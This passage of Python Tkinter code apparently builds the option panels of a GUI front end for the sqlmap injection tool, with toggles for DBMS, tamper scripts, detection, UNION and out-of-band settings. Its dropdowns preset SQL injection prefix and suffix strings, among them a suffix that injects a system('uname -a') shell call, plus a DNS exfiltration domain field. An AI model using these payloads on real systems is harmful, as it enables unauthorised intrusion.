        self.chk_dbms = ttk.Checkbutton(injection_lf)
        self.chk_dbms_var = tkinter.StringVar()
        self.chk_dbms.config(text="dbms", variable=self.chk_dbms_var, onvalue="on",
                             offvalue="off", command=self.f_dbms)
        self.chk_dbms.grid(row=0, column=0, sticky='sw')
        #
        self.box = ttk.Combobox(injection_lf)
        self.box_value = tkinter.StringVar()
        self.box.config(textvariable=self.box_value, state='disabled', width=30)
        self.box['values'] = (
            'mysql', 'my', 'percona', 'oracle', 'postgresql', 'mssqlserver', 'access', 'db2', 'sqlite', 'sqlite3',
            'firebird', 'sybase', 'maxdb', 'hsqldb', 'informix', 'mariadb', 'memsql', 'tidb', 'h2', 'monetdb', 'derby',
            'vertica', 'mckoi', 'presto', 'frontbase', 'cache', 'cratedb', 'cubrid', 'altibase', 'mimersql',
            'extremedb', 'virtuoso', 'yugabytedb', 'raima', 'iris', 'intersystems cache', 'apache ignite', 'drizzle',
            'greenplum', 'mimersql', 'altibase', 'amazon redshift', 'clickhouse', 'enterprisedb', 'opengauss', 'aurora',
            'cockroachdb')
        self.box.current(0)
        self.box.bind('<<ComboboxSelected>>', self.f_dbms)
        self.box.grid(row=0, column=1, sticky='ew', padx=3)
        # --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
        self.chk_dbms_cred = ttk.Checkbutton(injection_lf)
        self.chk_dbms_cred_var = tkinter.StringVar()
        self.chk_dbms_cred.config(text="dbms-cred", variable=self.chk_dbms_cred_var, onvalue="on",
                                  offvalue="off", command=self.f_dbms_cred)
        self.chk_dbms_cred.grid(row=1, column=0, sticky='w')
        #
        self.e_dbms_cred = ttk.Combobox(injection_lf)
        self.e_dbms_cred_value = tkinter.StringVar()
        self.e_dbms_cred.config(textvariable=self.e_dbms_cred_value, state='disabled', width=30)
        self.e_dbms_cred['values'] = (
            'user:password')
        self.e_dbms_cred.current(0)
        self.e_dbms_cred.bind('<<ComboboxSelected>>', self.f_dbms_cred)
        self.e_dbms_cred.grid(row=1, column=1, sticky='ew', padx=3)
        # -p TESTPARAMETER    Testable parameter(s)
        self.chk_test_parameter = ttk.Checkbutton(injection_lf)
        self.chk_test_parameter_var = tkinter.StringVar()
        self.chk_test_parameter.config(text="parameter", variable=self.chk_test_parameter_var, onvalue="on",
                                       offvalue="off", command=self.f_test_parameter)
        self.chk_test_parameter.grid(row=2, column=0, sticky='w')
        #
        self.e_test_parameter = ttk.Combobox(injection_lf)
        self.e_test_parameter_value = tkinter.StringVar()
        self.e_test_parameter.config(textvariable=self.e_test_parameter_value, state='disabled', width=30)
        self.e_test_parameter['values'] = (
            'Host', 'Cookie', 'User-Agent', 'Referer', 'X-Forwarded-For')
        self.e_test_parameter.current(0)
        self.e_test_parameter.bind('<<ComboboxSelected>>', self.f_test_parameter)
        self.e_test_parameter.grid(row=2, column=1, sticky='ew', padx=3)
        # --param-exclude     Regexp to exclude parameters from testing (e.g. "ses")
        self.chk_param_exclude = ttk.Checkbutton(injection_lf)
        self.chkParam_exclude_var = tkinter.StringVar()
        self.chk_param_exclude.config(text="param-exclude", variable=self.chkParam_exclude_var, onvalue="on",
                                      offvalue="off", command=self.f_param_exclude)
        self.chk_param_exclude.grid(row=3, column=0, sticky='w')
        #
        self.entry_param_exclude = ttk.Entry(injection_lf)
        self.entry_param_exclude.grid(row=3, column=1, sticky='we', padx=3)
        # --prefix=PREFIX     Injection payload prefix string
        self.chk_prefix = ttk.Checkbutton(injection_lf)
        self.chk_prefix_var = tkinter.StringVar()
        self.chk_prefix.config(text="prefix", variable=self.chk_prefix_var, onvalue="on",
                               offvalue="off", command=self.f_prefix)
        self.chk_prefix.grid(row=4, column=0, sticky=tkinter.W)
        #
        self.e_prefix = ttk.Combobox(injection_lf)
        self.e_prefix_value = tkinter.StringVar()
        self.e_prefix.config(textvariable=self.e_prefix_value, state='disabled', width=30)
        self.e_prefix['values'] = ('-1', '\')', 'and', '\'; #', '514951574551495157 #', '567895431246789807543 #',
                                   ' 123 #', ' #', " ' #")
        self.e_prefix.current(0)
        self.e_prefix.bind('<<ComboboxSelected>>', self.f_prefix)
        self.e_prefix.grid(row=4, column=1, sticky='ew', padx=3)
        # --suffix=SUFFIX     Injection payload suffix string
        self.chk_suffix = ttk.Checkbutton(injection_lf)
        self.chk_suffix_var = tkinter.StringVar()
        self.chk_suffix.config(text="suffix", variable=self.chk_suffix_var, onvalue="on",
                               offvalue="off", command=self.f_suffix)
        self.chk_suffix.grid(row=5, column=0, sticky='w')
        #
        self.e_suffix = ttk.Combobox(injection_lf)
        self.e_suffix_value = tkinter.StringVar()
        self.e_suffix.config(textvariable=self.e_suffix_value, state='disabled', width=30)
        self.e_suffix['values'] = (')--', ';-- ', ' ; --', ' --', ';)', ' -2908121187307716608',
                                   ' --567895431246789807543', ' -- a', ' ;#', ' ;//', ' # 123',
                                   " ;}system(\'uname%20-a');//", "AND (\'abc\'=\'abc\'")
        self.e_suffix.current(0)
        self.e_suffix.bind('<<ComboboxSelected>>', self.f_suffix)
        self.e_suffix.grid(row=5, column=1, sticky='ew', padx=3)
        # --os=OS             Force back-end DBMS operating system to this value
        self.e_os = ttk.Combobox(injection_lf)
        self.e_os_value = tkinter.StringVar()
        self.e_os.config(textvariable=self.e_os_value, state='disabled', width=30)
        self.e_os['values'] = ('linux', 'windows')
        self.e_os.current(0)
        self.e_os.bind('<<ComboboxSelected>>', self.f_os)
        self.e_os.grid(row=6, column=1, sticky='ew', padx=3)
        #
        self.chk_os = ttk.Checkbutton(injection_lf)
        self.chk_os_var = tkinter.StringVar()
        self.chk_os.config(text="OS", variable=self.chk_os_var, onvalue="on",
                           offvalue="off", command=self.f_os)
        self.chk_os.grid(row=6, column=0, sticky='w')
        # --skip=SKIP         Skip testing for given parameter(s)
        self.chk_skip = ttk.Checkbutton(injection_lf)
        self.chk_skip_var = tkinter.StringVar()
        self.chk_skip.config(text="skip", variable=self.chk_skip_var, onvalue="on",
                             offvalue="off", command=self.f_skip)
        self.chk_skip.grid(row=7, column=0, sticky='w')
        #
        self.e_skip_var = tkinter.StringVar()
        self.e_skip = ttk.Entry(injection_lf, width=30, textvariable=self.e_skip_var)
        self.e_skip_var = tkinter.StringVar()
        self.e_skip.grid(row=7, column=1, sticky='ew', padx=3)
        #
        #
        paned_inj = ttk.Panedwindow(injection_lf, orient="horizontal")
        paned_inj.rowconfigure(0, weight=1)
        paned_inj.columnconfigure(0, weight=1)
        # add:
        chk_inj_lf = ttk.Labelframe(paned_inj, text='')
        chk_inj_lf.rowconfigure(0, weight=1)
        chk_inj_lf.columnconfigure(0, weight=1)
        #
        paned_inj.add(chk_inj_lf)
        paned_inj.grid(row=9, column=0, columnspan=2, sticky='we')
        # --invalid-logical   Use logical operations for invalidating values
        self.chk_invalid_logical = ttk.Checkbutton(chk_inj_lf)
        self.chk_invalid_logical_var = tkinter.StringVar()
        self.chk_invalid_logical.config(text="invalid-logical", variable=self.chk_invalid_logical_var, onvalue="on",
                                        offvalue="off", command=self.f_invalid_logical, width=14)
        self.chk_invalid_logical.grid(row=0, column=0, sticky='w')
        # --invalid-bignum    Use big numbers for invalidating values
        self.chk_invalid_bignum = ttk.Checkbutton(chk_inj_lf)
        self.chk_invalid_bignum_var = tkinter.StringVar()
        self.chk_invalid_bignum.config(text="invalid-bignum", variable=self.chk_invalid_bignum_var, onvalue="on",
                                       offvalue="off", command=self.f_invalid_bignum, width=14)
        self.chk_invalid_bignum.grid(row=0, column=1, sticky='w')
        # --no-cast           Turn off payload casting mechanism
        self.chk_no_cast = ttk.Checkbutton(chk_inj_lf)
        self.chk_no_cast_var = tkinter.StringVar()
        self.chk_no_cast.config(text="no-cast", variable=self.chk_no_cast_var, onvalue="on",
                                offvalue="off", command=self.f_no_cast)
        self.chk_no_cast.grid(row=0, column=2, sticky='w')
        # --no-escape         Turn off string escaping mechanism
        self.chk_no_escape = ttk.Checkbutton(chk_inj_lf)
        self.chk_no_escape_var = tkinter.StringVar()
        self.chk_no_escape.config(text="no-escape", variable=self.chk_no_escape_var, onvalue="on",
                                  offvalue="off", command=self.f_no_escape)
        self.chk_no_escape.grid(row=1, column=0, sticky='w')
        # --skip-static       Skip testing parameters that not appear dynamic
        self.chk_skip_static = ttk.Checkbutton(chk_inj_lf)
        self.chk_skip_static_var = tkinter.StringVar()
        self.chk_skip_static.config(text="skip-static", variable=self.chk_skip_static_var, onvalue="on",
                                    offvalue="off", command=self.f_skip_static)
        self.chk_skip_static.grid(row=1, column=1, sticky='w')
        # --invalid-string    Use random strings for invalidating values
        self.chk_invalid_string = ttk.Checkbutton(chk_inj_lf)
        self.chk_invalid_string_var = tkinter.StringVar()
        self.chk_invalid_string.config(text='invalid-string', variable=self.chk_invalid_string_var, onvalue="on",
                                       offvalue="off", command=self.f_invalid_string)
        self.chk_invalid_string.grid(row=1, column=2, sticky='w')
        # --proof     Prove exploitation of the detected injection point(s)
        self.chk_proof = ttk.Checkbutton(chk_inj_lf)
        self.chk_proof_var = tkinter.StringVar()
        self.chk_proof.config(text="proof", variable=self.chk_proof_var, onvalue="on",
                              offvalue="off", command=self.f_proof)
        self.chk_proof.grid(row=2, column=0, sticky='w')
        # --esperanto         Use the DBMS-agnostic enumeration engine
        self.chk_esperanto = ttk.Checkbutton(chk_inj_lf)
        self.chk_esperanto_var = tkinter.StringVar()
        self.chk_esperanto.config(text="esperanto", variable=self.chk_esperanto_var, onvalue="on",
                                  offvalue="off", command=self.f_esperanto)
        self.chk_esperanto.grid(row=2, column=1, sticky='w')
        # --tamper=TAMPER     Use given script(s) for tampering injection data
        self.tamper = tkinter.Listbox(tampers_lf, height=9, width=10, font='TkDefaultFont',
                                     selectmode=tkinter.EXTENDED)
        # *.py in listbox, exclude __init__.py
        files_tamper = os.listdir("./tamper")
        tampers = filter(lambda x: x.endswith('.py'), files_tamper)
        for tamp_list in sorted(tampers):
            if tamp_list not in "__init__.py":
                self.tamper.insert(tkinter.END, tamp_list)
        self.tamper.rowconfigure(0, weight=1)
        self.tamper.columnconfigure(0, weight=1)
        self.tamper.grid(row=0, column=0, padx=5, sticky='nswe')
        # Listbox - TAMPER SCROLL (Listed all tampers and get them scroll)
        scroll_tamper = ttk.Scrollbar(tampers_lf, orient="vertical", command=self.tamper.yview)
        self.tamper['yscrollcommand'] = scroll_tamper.set
        scroll_tamper.grid(row=0, column=1, sticky='ns')
        scroll_tamper_x = ttk.Scrollbar(tampers_lf, orient='horizontal',
                                       command=self.tamper.xview)
        self.tamper.configure(xscrollcommand=scroll_tamper_x.set)
        scroll_tamper_x.grid(row=1, column=0, sticky='ew', padx=5)
        #
        paned_d_t_o = ttk.Frame(s_det_tech_f)
        paned_d_t_o.columnconfigure(0, weight=3, uniform="options")
        paned_d_t_o.columnconfigure(1, weight=2, uniform="options")
        #
        detection_lf = ttk.Labelframe(paned_d_t_o, text='Detection')
        detection_lf.columnconfigure(0, minsize=125)
        detection_lf.columnconfigure(1, weight=1)
        #
        technique_lf = ttk.Labelframe(paned_d_t_o, text='Technique')
        technique_lf.columnconfigure(0, minsize=125)
        technique_lf.columnconfigure(1, weight=1)
        #
        detection_lf.grid(row=0, column=0, sticky='nsew', padx=(0, 4))
        technique_lf.grid(row=0, column=1, sticky='nsew')
        paned_d_t_o.grid(row=1, column=0, columnspan=2, sticky='we', ipady=0)
        # --string=STRING     String to match when query is evaluated to True
        self.e_string = ttk.Combobox(detection_lf)
        self.e_string_value = tkinter.StringVar()
        self.e_string.config(textvariable=self.e_string_value, state='disabled', width=30)
        # Python hexadecimal backslash quoting to do multi line matching
        self.e_string['values'] = ('\\x0a', '\\x09', 'Name\\x0a\\x09\\x09Stephen')
        self.e_string.current(0)
        self.e_string.bind('<<ComboboxSelected>>', self.f_string)
        self.e_string.grid(row=0, column=1, sticky='ew', padx=3)
        #
        self.chk_string = ttk.Checkbutton(detection_lf)
        self.chk_string_var = tkinter.StringVar()
        self.chk_string.config(text="String", variable=self.chk_string_var, onvalue="on",
                               offvalue="off", command=self.f_string)
        self.chk_string.grid(row=0, column=0, sticky='w')
        # --not-string=NOT..  String to match when query is evaluated to False
        self.e_not_string = ttk.Combobox(detection_lf)
        self.e_not_string_value = tkinter.StringVar()
        self.e_not_string.config(textvariable=self.e_not_string_value, state='disabled', width=30)
        # Python hexadecimal backslash quoting to do multi line matching
        self.e_not_string['values'] = ('\\x0a', '\\x09', 'Name\\x0a\\x09\\x09Stephen')
        self.e_not_string.current(0)
        self.e_not_string.bind('<<ComboboxSelected>>', self.f_not_string)
        self.e_not_string.grid(row=1, column=1, sticky='ew', padx=3)
        #
        self.chk_not_string = ttk.Checkbutton(detection_lf)
        self.chk_not_string_var = tkinter.StringVar()
        self.chk_not_string.config(text="not-String", variable=self.chk_not_string_var, onvalue="on",
                                   offvalue="off", command=self.f_not_string)
        self.chk_not_string.grid(row=1, column=0, sticky='w')
        # --regexp=REGEXP     Regexp to match when query is evaluated to True
        self.e_regexp = ttk.Combobox(detection_lf)
        self.e_regexp_value = tkinter.StringVar()
        self.e_regexp.config(textvariable=self.e_regexp_value, state='disabled', width=30)
        self.e_regexp['values'] = ('\\n', '\\t', '\\r', '\\r,\\n', '\\e', '\\f', '\\v')
        self.e_regexp.current(0)
        self.e_regexp.bind('<<ComboboxSelected>>', self.f_regexp)
        self.e_regexp.grid(row=2, column=1, sticky='ew', padx=3)
        #
        self.chk_regexp = ttk.Checkbutton(detection_lf)
        self.chk_regexp_var = tkinter.StringVar()
        self.chk_regexp.config(text="Regexp", variable=self.chk_regexp_var, onvalue="on",
                               offvalue="off", command=self.f_regexp)
        self.chk_regexp.grid(row=2, column=0, sticky='w')
        # --code=CODE         HTTP code to match when query is evaluated to True
        self.chk_code = ttk.Checkbutton(detection_lf)
        self.chk_code_var = tkinter.StringVar()
        self.chk_code.config(text="Code", variable=self.chk_code_var, onvalue="on",
                             offvalue="off", command=self.f_code)
        self.chk_code.grid(row=3, column=0, sticky='w')
        #
        self.e_code = ttk.Combobox(detection_lf)
        self.e_code_value = tkinter.StringVar()
        self.e_code.config(textvariable=self.e_code_value, state='disabled', width=10)
        self.e_code['values'] = ('200', '403', '500', '404')
        self.e_code.current(0)
        self.e_code.bind('<<ComboboxSelected>>', self.f_code)
        self.e_code.grid(row=3, column=1, sticky='ew', padx=3)
        # --lengths           Compare pages based only on their content length
        self.chk_lengths = ttk.Checkbutton(detection_lf)
        self.chk_lengths_var = tkinter.StringVar()
        self.chk_lengths.config(text="lengths", variable=self.chk_lengths_var, onvalue="on",
                                 offvalue="off", command=self.f_lengths)
        self.chk_lengths.grid(row=4, column=0, sticky='w')
        # --smart             Conduct through tests only if positive heuristic(s)
        self.chk_smart = ttk.Checkbutton(detection_lf)
        self.chk_smart_var = tkinter.StringVar()
        self.chk_smart.config(text="smart", variable=self.chk_smart_var, onvalue="on",
                              offvalue="off", command=self.f_smart)
        self.chk_smart.grid(row=5, column=0, sticky='w')
        # --level=LEVEL       Level of tests to perform (1-5, default 1)
        self.chk_level = ttk.Checkbutton(detection_lf)
        self.chk_level_var = tkinter.StringVar()
        self.chk_level.config(text="level", variable=self.chk_level_var, onvalue="on",
                              offvalue="off", command=self.f_level)
        self.chk_level.grid(row=6, column=0, sticky='w')
        #
        self.e_level = ttk.Combobox(detection_lf)
        self.e_level_value = tkinter.StringVar()
        self.e_level.config(textvariable=self.e_level_value, state='disabled', width=5)
        self.e_level['values'] = ('1', '2', '3', '4', '5')
        self.e_level.current(0)
        self.e_level.bind('<<ComboboxSelected>>', self.f_level)
        self.e_level.grid(row=6, column=1, sticky='ew', padx=3)
        # --risk=RISK         Risk of tests to perform (1-3, default 1)
        self.chk_risk = ttk.Checkbutton(detection_lf)
        self.chk_risk_var = tkinter.StringVar()
        self.chk_risk.config(text="risk", variable=self.chk_risk_var, onvalue="on",
                             offvalue="off", command=self.f_risk)
        self.chk_risk.grid(row=7, column=0, sticky='w')
        #
        self.e_risk = ttk.Combobox(detection_lf)
        self.e_risk_value = tkinter.StringVar()
        self.e_risk.config(textvariable=self.e_risk_value, state='disabled', width=5)
        self.e_risk['values'] = ('1', '2', '3')
        self.e_risk.current(0)
        self.e_risk.bind('<<ComboboxSelected>>', self.f_risk)
        self.e_risk.grid(row=7, column=1, sticky='ew', padx=3)
        # --text-only         Compare pages based only on the textual content
        self.chk_text_only = ttk.Checkbutton(detection_lf)
        self.chk_text_only_var = tkinter.StringVar()
        self.chk_text_only.config(text="text-only", variable=self.chk_text_only_var, onvalue="on",
                                  offvalue="off", command=self.f_text_only)
        self.chk_text_only.grid(row=8, column=0, sticky='w')
        # --titles            Compare pages based only on their titles
        self.chk_titles = ttk.Checkbutton(detection_lf)
        self.chk_titles_var = tkinter.StringVar()
        self.chk_titles.config(text="titles", variable=self.chk_titles_var, onvalue="on",
                               offvalue="off", command=self.f_titles)
        self.chk_titles.grid(row=9, column=0, sticky='w')
        # --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
        self.chk_technique = ttk.Checkbutton(technique_lf)
        self.chk_tech_var = tkinter.StringVar()
        self.chk_technique.config(text="technique", variable=self.chk_tech_var, onvalue="on",
                                  offvalue="off", command=self.f_technique)
        self.chk_technique.grid(row=0, column=0, sticky='nw')
        #
        self.e_technique = ttk.Combobox(technique_lf)
        self.e_technique_value = tkinter.StringVar()
        self.e_technique.config(textvariable=self.e_technique_value, state='disabled', width=10)
        self.e_technique['values'] = ('BEUSTQ', 'EUS', 'BEUS', 'BEUSQ', 'BEU', 'B', 'E', 'U', 'S', 'T', 'Q')
        self.e_technique.current(0)
        self.e_technique.bind('<<ComboboxSelected>>', self.f_technique)
        self.e_technique.grid(row=0, column=1, sticky='ew', padx=3)
        # --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
        self.chk_union_cols = ttk.Checkbutton(technique_lf)
        self.chk_union_cols_var = tkinter.StringVar()
        self.chk_union_cols.config(text="union-cols", variable=self.chk_union_cols_var, onvalue="on",
                                   offvalue="off", command=self.f_union_cols)
        self.chk_union_cols.grid(row=1, column=0, sticky='nw')
        #
        self.e_union_cols = ttk.Combobox(technique_lf)
        self.e_union_cols_value = tkinter.StringVar()
        self.e_union_cols.config(textvariable=self.e_union_cols_value, state='disabled', width=10)
        self.e_union_cols['values'] = ('1-100', '50-100', '1-1000')
        self.e_union_cols.current(0)
        self.e_union_cols.bind('<<ComboboxSelected>>', self.f_union_cols)
        self.e_union_cols.grid(row=1, column=1, sticky='ew', padx=3)
        self.chk_union_cols.grid(row=1, column=0, sticky='nw')
        # --union-char=UCHAR  Character to use for bruteforcing number of columns
        self.chk_union_char = ttk.Checkbutton(technique_lf)
        self.chk_union_char_var = tkinter.StringVar()
        self.chk_union_char.config(text="union-char", variable=self.chk_union_char_var, onvalue="on",
                                   offvalue="off", command=self.f_union_char)
        self.chk_union_char.grid(row=2, column=0, sticky='nw')
        #
        self.e_union_char = ttk.Combobox(technique_lf)
        self.e_union_char_value = tkinter.StringVar()
        self.e_union_char.config(textvariable=self.e_union_char_value, state='disabled', width=10)
        self.e_union_char['values'] = ('123', '7', '17')
        self.e_union_char.current(0)
        self.e_union_char.bind('<<ComboboxSelected>>', self.f_union_char)
        self.e_union_char.grid(row=2, column=1, sticky='ew', padx=3)
        # --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
        self.chk_union_from = ttk.Checkbutton(technique_lf)
        self.chk_union_from_var = tkinter.StringVar()
        self.chk_union_from.config(text="union-from", variable=self.chk_union_from_var, onvalue="on",
                                   offvalue="off", command=self.f_union_from)
        self.chk_union_from.grid(row=3, column=0, sticky='nw')
        #
        self.e_union_from = ttk.Combobox(technique_lf)
        self.e_union_from_value = tkinter.StringVar()
        self.e_union_from.config(textvariable=self.e_union_from_value, state='disabled', width=10)
        self.e_union_from['values'] = ('admin@localhost', 'users', '@adminID')
        self.e_union_from.current(0)
        self.e_union_from.bind('<<ComboboxSelected>>', self.f_union_from)
        self.e_union_from.grid(row=3, column=1, sticky='ew', padx=3)
        # --union-values="'foobar',*,1."
        self.chk_union_values = ttk.Checkbutton(technique_lf)
        self.chk_union_values_var = tkinter.StringVar()
        self.chk_union_values.config(text="union-value", variable=self.chk_union_values_var, onvalue="on",
                                     offvalue="off", command=self.f_union_values)
        self.chk_union_values.grid(row=4, column=0, sticky='nw')
        #
        self.e_union_values = ttk.Combobox(technique_lf)
        self.e_union_values_value = tkinter.StringVar()
        self.e_union_values.config(textvariable=self.e_union_values_value, state='disable', width=10)
        self.e_union_values['values'] = ('foobar', '*', '1')
        self.e_union_values.current(0)
        self.e_union_values.bind('<<ComboboxSelected>>', self.f_union_values)
        self.e_union_values.grid(row=4, column=1, sticky='ew', padx=3)
        # --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
        self.chk_time_sec = ttk.Checkbutton(technique_lf)
        self.chk_time_sec_var = tkinter.StringVar()
        self.chk_time_sec.config(text="time-sec", variable=self.chk_time_sec_var, onvalue="on",
                                 offvalue="off", command=self.f_time_sec)
        self.chk_time_sec.grid(row=5, column=0, sticky='nw')
        #
        self.e_time_sec = ttk.Combobox(technique_lf)
        self.e_time_sec_value = tkinter.StringVar()
        self.e_time_sec.config(textvariable=self.e_time_sec_value, state='disabled', width=10)
        self.e_time_sec['values'] = ('2', '10', '15', '20')
        self.e_time_sec.current(0)
        self.e_time_sec.bind('<<ComboboxSelected>>', self.f_time_sec)
        self.e_time_sec.grid(row=5, column=1, sticky='nwe', padx=3)
        # --dns-domain=DNS..  Domain name used for DNS exfiltration attack
        self.chk_dns_domain = ttk.Checkbutton(technique_lf)
        self.chk_dns_domain_var = tkinter.StringVar()
        self.chk_dns_domain.config(text="dns-domain", variable=self.chk_dns_domain_var, onvalue="on",
                                   offvalue="off", command=self.f_dns_domain)
        self.chk_dns_domain.grid(row=6, column=0, sticky='nw')
        #
        self.e_dns_domain = ttk.Combobox(technique_lf)
        self.e_dns_domain_value = tkinter.StringVar()
        self.e_dns_domain.config(textvariable=self.e_dns_domain_value, state='disabled', width=15)
        self.e_dns_domain['values'] = 'ns1.yourdomain.com'
        self.e_dns_domain.current(0)
        self.e_dns_domain.bind('<<ComboboxSelected>>', self.f_dns_domain)
        self.e_dns_domain.grid(row=6, column=1, sticky='nwe', padx=3)
        # --second-url=SEC..  Resulting page URL searched for second-order response
        self.chk_sec_url = ttk.Checkbutton(technique_lf)
        self.chk_second_url_var = tkinter.StringVar()
        self.chk_sec_url.config(text="second-url", variable=self.chk_second_url_var, onvalue="on",
                                offvalue="off", command=self.f_second_url)
        self.chk_sec_url.grid(row=7, column=0, sticky='nw')
        #
        self.entry_sec_url = ttk.Combobox(technique_lf)
        self.e_second_url_value = tkinter.StringVar()
        self.entry_sec_url.config(textvariable=self.e_second_url_value, state='disabled', width=10)
        self.entry_sec_url['values'] = ('http://www.domain.com/', 'https://www.newdomain.com/')
        self.entry_sec_url.current(0)
        self.entry_sec_url.bind('<<ComboboxSelected>>', self.f_second_url)
        self.entry_sec_url.grid(row=7, column=1, sticky='nwe', padx=3)
        # --second-req=SEC..  Load second-order HTTP request from file
        self.chk_sec_req = ttk.Checkbutton(technique_lf)
        self.chk_second_req_var = tkinter.StringVar()
        self.chk_sec_req.config(text="second-req", variable=self.chk_second_req_var, onvalue="on",
                                offvalue="off", command=self.f_second_req)
        self.chk_sec_req.grid(row=8, column=0, sticky='nw')
        #
        self.entry_second_req = ttk.Combobox(technique_lf)
        self.e_second_req_value = tkinter.StringVar()
        self.entry_second_req.config(textvariable=self.e_second_req_value, state='disabled', width=10)
        self.entry_second_req['values'] = ('http://www.domain.com/', 'https://www.domain.com/')
        self.entry_second_req.current(0)
        self.entry_second_req.bind('<<ComboboxSelected>>', self.f_second_req)
        self.entry_second_req.grid(row=8, column=1, sticky='nwe', padx=3)
        # Non-SQL injection techniques
        non_sql_lf = ttk.Labelframe(technique_lf, text='Non-SQL techniques')
        non_sql_lf.columnconfigure(1, weight=1)
        non_sql_lf.grid(row=20, column=0, columnspan=2, sticky='ew', pady=6)
        non_sql_lf.columnconfigure(0, weight=0)
        non_sql_lf.columnconfigure(1, weight=1)
        # --nosql: NoSQL injection
        self.chk_nosql = ttk.Checkbutton(non_sql_lf)
        self.chk_nosql_var = tkinter.StringVar()
        self.chk_nosql.config(text="nosql", variable=self.chk_nosql_var, onvalue="on",
                              offvalue="off", command=self.f_nosql)
        self.chk_nosql.grid(row=0, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --graphql: GraphQL injection
        self.chk_graphql = ttk.Checkbutton(non_sql_lf)
        self.chk_graphql_var = tkinter.StringVar()
        self.chk_graphql.config(text="graphql", variable=self.chk_graphql_var, onvalue="on",
                                offvalue="off", command=self.f_graphql)
        self.chk_graphql.grid(row=1, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --ldap: LDAP injection
        self.chk_ldap = ttk.Checkbutton(non_sql_lf)
        self.chk_ldap_var = tkinter.StringVar()
        self.chk_ldap.config(text="ldap", variable=self.chk_ldap_var, onvalue="on",
                             offvalue="off", command=self.f_ldap)
        self.chk_ldap.grid(row=3, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --xpath: XPath injection
        self.chk_xpath = ttk.Checkbutton(non_sql_lf)
        self.chk_xpath_var = tkinter.StringVar()
        self.chk_xpath.config(text="xpath", variable=self.chk_xpath_var, onvalue="on",
                              offvalue="off", command=self.f_xpath)
        self.chk_xpath.grid(row=4, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --ssti: server-side template injection
        self.chk_ssti = ttk.Checkbutton(non_sql_lf)
        self.chk_ssti_var = tkinter.StringVar()
        self.chk_ssti.config(text="ssti", variable=self.chk_ssti_var, onvalue="on",
                             offvalue="off", command=self.f_ssti)
        self.chk_ssti.grid(row=6, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --xslt: XSLT injection
        self.chk_xslt = ttk.Checkbutton(non_sql_lf)
        self.chk_xslt_var = tkinter.StringVar()
        self.chk_xslt.config(text="xslt", variable=self.chk_xslt_var, onvalue="on",
                             offvalue="off", command=self.f_xslt)
        self.chk_xslt.grid(row=9, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --xxe: XML External Entity (XXE) injection
        self.chk_xxe = ttk.Checkbutton(non_sql_lf)
        self.chk_xxe_var = tkinter.StringVar()
        self.chk_xxe.config(text="xxe", variable=self.chk_xxe_var, onvalue="on",
                            offvalue="off", command=self.f_xxe)
        self.chk_xxe.grid(row=10, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --hql: HQL/JPQL (Hibernate ORM) injection
        self.chk_hql = ttk.Checkbutton(non_sql_lf)
        self.chk_hql_var = tkinter.StringVar()
        self.chk_hql.config(text="hql", variable=self.chk_hql_var, onvalue="on",
                            offvalue="off", command=self.f_hql)
        self.chk_hql.grid(row=7, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --sparql: SPARQL injection
        self.chk_sparql = ttk.Checkbutton(non_sql_lf)
        self.chk_sparql_var = tkinter.StringVar()
        self.chk_sparql.config(text="sparql", variable=self.chk_sparql_var, onvalue="on",
                               offvalue="off", command=self.f_sparql)
        self.chk_sparql.grid(row=11, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --odata: OData $filter injection
        self.chk_odata = ttk.Checkbutton(non_sql_lf)
        self.chk_odata_var = tkinter.StringVar()
        self.chk_odata.config(text="odata", variable=self.chk_odata_var, onvalue="on",
                              offvalue="off", command=self.f_odata)
        self.chk_odata.grid(row=12, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --jwt: Audit JSON Web Tokens (JWT) for weaknesses
        self.chk_jwt = ttk.Checkbutton(non_sql_lf)
        self.chk_jwt_var = tkinter.StringVar()
        self.chk_jwt.config(text="jwt", variable=self.chk_jwt_var, onvalue="on",
                            offvalue="off", command=self.f_jwt)
        self.chk_jwt.grid(row=2, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --oob-server=OOB..  Out-of-band server for blind '--xxe'
        self.chk_oob_server = ttk.Checkbutton(non_sql_lf)
        self.chk_oob_server_var = tkinter.StringVar()
        self.chk_oob_server.config(text="oob-server", variable=self.chk_oob_server_var, onvalue="on",
                                   offvalue="off", command=self.f_oob_server)
        self.chk_oob_server.grid(row=5, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_oob_server = ttk.Entry(non_sql_lf, width=18)
        self.e_oob_server.grid(row=5, column=1, sticky='ew', pady=3)
        # --oob-token=OOBT..  Authentication token for a self-hosted '--oob-server'
        self.chk_oob_token = ttk.Checkbutton(non_sql_lf)
        self.chk_oob_token_var = tkinter.StringVar()
        self.chk_oob_token.config(text="oob-token", variable=self.chk_oob_token_var, onvalue="on",
                                  offvalue="off", command=self.f_oob_token)
        self.chk_oob_token.grid(row=8, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_oob_token = ttk.Entry(non_sql_lf, width=18)
        self.e_oob_token.grid(row=8, column=1, sticky='ew', pady=3)
        # DATA BOX
        data_n = ttk.Notebook(request_f)
        data1 = ttk.Frame(data_n)
        data_n.add(data1, text='Request & headers')
        data1.columnconfigure(0, weight=1)
        data2 = ttk.Frame(data_n)
        data_n.add(data2, text='Connection & auth')
        data2.columnconfigure(0, weight=1)
        data3 = ttk.Frame(data_n)
        data3.columnconfigure(0, weight=1)
        data_n.add(data3, text='Session & handling')
        data_n.columnconfigure(0, weight=1)
        data_n.grid(row=0, sticky='nswe', padx=5, pady=5)
        data_lf = ttk.Labelframe(data1, text='Request & headers')
        data_lf.columnconfigure(1, weight=1)
        data_lf.grid(row=0, column=0, pady=10, sticky='we')
        # DATA 1
